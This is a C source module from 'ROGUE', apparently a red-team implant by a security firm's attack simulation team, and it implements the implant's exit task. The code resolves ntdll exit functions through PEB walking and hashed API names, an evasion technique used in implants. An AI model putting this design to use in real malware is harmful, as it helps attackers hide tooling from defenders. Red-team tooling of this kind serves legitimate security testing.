/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	DWORD Type;
} EXITFREE_ARG_BUF, *PEXITFREE_ARG_BUF;

typedef struct
{
	D_API( RtlExitUserProcess );
	D_API( RtlExitUserThread );
} API ;

/* API Hashes */
#define H_API_RTLEXITUSERPROCESS	0x0057c72f /* RtlExitUserProcess */
#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Sets the exit mode and sets the established
 * connection to FALSE for Rogue.
 *
!*/
D_SEC( B ) DWORD TaskExit( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _In_ PVOID Buffer, _In_ ULONG Length, _In_ PBUFFER Output )
{
	API			Api;
	PEXITFREE_ARG_BUF	Tsk = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Get the input arg */
	Tsk = C_PTR( Buffer );

	switch ( Tsk->Type ) {
		/* Extract the current type */
		case 0:
			/* Exit the current process */
			Context->Exit = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERPROCESS );
			break;
		case 1:
			/* Exit the current thread */
			Context->Exit = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
			break;
		case 2:
			Context->Exit = C_PTR( G_PTR( ExitFreeThread ) );
			break;
		case 3:
			Context->Exit = NULL;
			break;
	};

	/* Set to false! */
	Context->Established = FALSE;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Notify we are exiting. */
	return ExitFreeAction;
};
